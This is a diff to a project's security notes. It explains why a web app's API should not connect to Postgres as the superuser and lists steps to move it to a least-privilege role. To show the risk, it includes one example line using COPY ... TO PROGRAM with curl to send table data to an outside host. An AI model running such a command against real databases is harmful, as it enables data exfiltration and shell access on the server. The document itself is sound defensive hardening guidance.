@@ -353,3 +353,56 @@ to the panel; it answers 404 to anybody else).
 rotation. It is git-ignored and was never committed, so nothing leaked, but it
 holds a retired signing key and has no further use. Worth deleting from the VPS
 and from the working copy.
+
+## Take the superuser away from the app — one job on the VPS
+
+The API connects to Postgres as `postgres`, the cluster superuser. Every query
+in the code is parameterised and none can be injected — that was checked line by
+line, and `backend/Scripts/check-sql.py` now runs as part of `check-cs.sh` to
+keep it true. But that is the first half of the answer; this is the second,
+because they protect against different things.
+
+Parameterising stops input from becoming SQL. This limits what SQL can do if
+something ever does get through. As a superuser, SQL is not limited to the data:
+
+    COPY orders TO PROGRAM 'curl -d @- http://somewhere'
+
+`COPY ... PROGRAM` runs a **shell command on the VPS**. So an injection against
+a superuser connection is not a data breach, it is a shell on the server. The
+same role can also read `/etc/passwd`, read every password hash in `pg_authid`,
+and `DROP DATABASE`. A plain role that merely owns its own tables can do none of
+that, and the worst case shrinks from the server to this one database.
+
+Steps, once:
+
+    # 1. pick a long random password
+    openssl rand -base64 24
+
+    # 2. create the role and hand the tables over
+    cd /path/to/mahalaxmi-nextjs
+    docker compose exec -T postgres psql -U postgres -d mahalaxmi_fashionhub \
+      -v app_password="'PASTE_THE_PASSWORD'" < database/least-privilege.sql
+
+The script prints how many tables it moved and a table showing `is_superuser`
+`false` for `mfh_app`. It is safe to re-run.
+
+    # 3. point the backend at it, in the stack's .env
+    APP_DB_USER=mfh_app
+    APP_DB_PASSWORD=PASTE_THE_PASSWORD
+
+    # 4. restart and read the log
+    docker compose up -d backend
+    docker compose logs backend | grep -i DbPrivileges
+
+Expected: `Database user mfh_app is not a superuser.`
+While it is unset, every boot logs a warning naming the risk — that is
+deliberate, so this does not get quietly undone by a restore or a rebuild.
+
+Two notes:
+
+- **Both** variables must be set. The backend ignores one without the other
+  rather than half-applying it, because falling back to the superuser over a
+  missing password is the one failure that would look finished and not be.
+- On a **fresh** install, `database/schema.sql` runs as `postgres` and the new
+  tables are owned by `postgres` again, so the script has to be run once more
+  after that.
